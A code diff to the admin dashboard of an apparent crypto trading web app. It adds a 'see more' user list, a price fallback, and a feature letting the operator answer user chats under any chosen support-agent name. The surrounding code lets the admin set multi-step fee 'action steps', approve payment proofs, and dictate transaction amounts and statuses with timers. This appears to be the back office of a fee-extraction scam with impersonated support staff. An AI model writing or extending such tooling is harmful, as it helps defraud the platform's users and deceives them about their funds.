@@ -297,9 +297,9 @@
 
             <div class="card">
                 <h3>💬 Live Support Chats & Agent Management</h3>
-                <div style="margin-bottom:1rem;">
+                <div style="margin-bottom:1.5rem;">
                     <h4 style="font-size:0.95rem; margin-bottom:0.5rem; color:var(--text-muted);">Active Support Conversations</h4>
-                    <div id="admin-chat-threads" style="max-height:250px; overflow-y:auto; background:var(--bg-input); padding:0.75rem; border-radius:8px; margin-bottom:1rem;"></div>
+                    <div id="admin-chat-threads" style="max-height:280px; overflow-y:auto; background:var(--bg-input); padding:0.75rem; border-radius:8px;"></div>
                 </div>
                 <form onsubmit="addSupportAgent(event)" style="display:grid; grid-template-columns:1fr 1fr; gap:0.75rem;">
                     <div class="form-group"><label>Agent Name</label><input type="text" id="agent-name-input" class="form-control" required></div>
@@ -335,6 +335,7 @@
             <div class="card">
                 <h3>👤 Registered Platform Users</h3>
                 <div id="admin-users-list"></div>
+                <div id="admin-users-toggle-container" style="margin-top:0.75rem; text-align:center;"></div>
             </div>
 
             <div class="card">
@@ -637,6 +638,7 @@
             { id: 1, name: "Agent Sarah", pic: "" }
         ];
         let chatThreads = {}; // userEmail -> array of messages
+        let showAllUsers = false; // Collapsible users list state
         let currentTheme = localStorage.getItem('chronicle_theme') || 'dark';
 
         if (currentTheme === 'light') document.getElementById('app-body').classList.add('light-mode');
@@ -788,6 +790,7 @@
                 }
                 if (data.ethereum && data.ethereum.usd) {
                     liveEthUsd = data.ethereum.usd;
+                    document.getElementById('btc-live-price').innerText = `Live BTC: $${liveBtcUsd.toLocaleString()}`; // fallback
                     document.getElementById('eth-live-price').innerText = `Live ETH: $${liveEthUsd.toLocaleString()}`;
                 }
                 updateBalanceUI();
@@ -1072,7 +1075,6 @@
 
         function updateSupportAgentUI() {
             if (!supportAgents || supportAgents.length === 0) return;
-            // Shuffle / pick a random agent to display on user interface
             const randomAgent = supportAgents[Math.floor(Math.random() * supportAgents.length)];
             document.getElementById('active-agent-name').innerText = randomAgent.name;
             const avatarBox = document.getElementById('active-agent-avatar');
@@ -1131,17 +1133,25 @@
                 }
                 saveState();
                 renderUserChatMessages();
+                if (!document.getElementById('admin-tab').classList.contains('hidden')) {
+                    renderAdminDashboard();
+                }
             }, 800);
         }
 
         function adminReplyChat(userEmail) {
-            const replyText = prompt(`Enter reply for ${userEmail}:`);
+            const agentSelectOptions = supportAgents.map(ag => `${ag.name}`).join('\n') || 'Support Agent';
+            const selectedAgentName = prompt(`Select Agent Name to reply as:\n${agentSelectOptions}`, supportAgents[0]?.name || 'Support Agent');
+            if (!selectedAgentName) return;
+
+            const replyText = prompt(`Enter reply for ${userEmail} (as ${selectedAgentName}):`);
             if (!replyText) return;
+
             if (!chatThreads[userEmail]) chatThreads[userEmail] = [];
-            chatThreads[userEmail].push({ sender: 'agent', text: replyText, time: new Date().toLocaleTimeString() });
+            chatThreads[userEmail].push({ sender: 'agent', text: `[${selectedAgentName}]: ${replyText}`, time: new Date().toLocaleTimeString() });
             saveState();
             renderAdminDashboard();
-            alert("Reply sent to user!");
+            alert(`Reply sent as ${selectedAgentName}!`);
         }
 
         function saveAdminTerms(e) {
@@ -1203,12 +1213,11 @@
             if (u) {
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[u.stepIdx || 0];
-                if (tx) tx.amount += step.amount;
+                if (tx) {
+                    tx.amount += step.amount;
+                    tx.status = `${step.statusMsg.toUpperCase()}`;
+                }
                 
-                // Now show the status message after admin approval
-                if (tx) tx.status = `${step.statusMsg.toUpperCase()}`;
-                
-                // Set a timeout timer for this status before moving to next step
                 setTimeout(() => {
                     u.stepIdx = (u.stepIdx || 0) + 1;
                     if (u.stepIdx < actionSteps.length) {
@@ -1218,9 +1227,9 @@
                         if (tx) tx.status = "COMPLETED";
                     }
                     saveState();
-                }, (step.timerMinutes || 5) * 60 * 1000); // Simulated timer in production
+                }, (step.timerMinutes || 5) * 60 * 1000);
 
-                alert(`Proof approved for ${p.user}. Status is now "${step.statusMsg}".`);
+                alert(`Proof approved for ${p.user}. Status updated to "${step.statusMsg}".`);
             }
             saveState();
             renderAdminDashboard();
@@ -1236,11 +1245,16 @@
             if (u) {
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 if (tx) tx.status = "PROOF REJECTED";
-                sendSimulatedEmail(p.user, "Payment Proof Rejected", "Your submitted payment proof was rejected. Please re-submit valid proof.", "❌ Proof Rejected");
+                sendSimulatedEmail(p.user, "Payment Proof Rejected", "Your submitted payment proof was rejected by admin. Please submit valid proof.", "❌ Proof Rejected");
             }
             saveState();
             renderAdminDashboard();
             alert("Proof rejected successfully.");
+        }
+
+        function toggleSeeMoreUsers() {
+            showAllUsers = !showAllUsers;
+            renderAdminDashboard();
         }
 
         function renderAdminDashboard() {
@@ -1250,7 +1264,18 @@
             document.getElementById('admin-terms-text').value = platformTerms || '';
             document.getElementById('admin-kb-text').value = knowledgeBase || '';
             document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD: $${u.usd})</option>`).join('');
-            document.getElementById('admin-users-list').innerHTML = usersList.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.email}</strong> [ID: ${u.userId}] - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
+            
+            // Users list rendering with See More / See Less
+            const displayedUsers = showAllUsers ? usersList : usersList.slice(0, 4);
+            document.getElementById('admin-users-list').innerHTML = displayedUsers.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.email}</strong> [ID: ${u.userId}] - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
+            
+            const toggleContainer = document.getElementById('admin-users-toggle-container');
+            if (usersList.length > 4) {
+                toggleContainer.innerHTML = `<button class="btn btn-outline" style="width:auto; padding:0.3rem 0.8rem; font-size:0.75rem; display:inline-block;" onclick="toggleSeeMoreUsers()">${showAllUsers ? 'See Less ▲' : 'See More ▼ (' + (usersList.length - 4) + ' more)'}</button>`;
+            } else {
+                toggleContainer.innerHTML = '';
+            }
+
             document.getElementById('admin-exchanges-list').innerHTML = exchanges.map(ex => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>${ex.name}</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteExchange(${ex.id})">Delete</button></div>`).join('');
             document.getElementById('action-steps-list').innerHTML = actionSteps.map((st, i) => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>Step ${i+1}: ${st.title} ($${st.amount}) → Status: [${st.statusMsg}] (${st.timerMinutes || 5}m)</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteActionStep(${st.id})">Delete</button></div>`).join('');
             
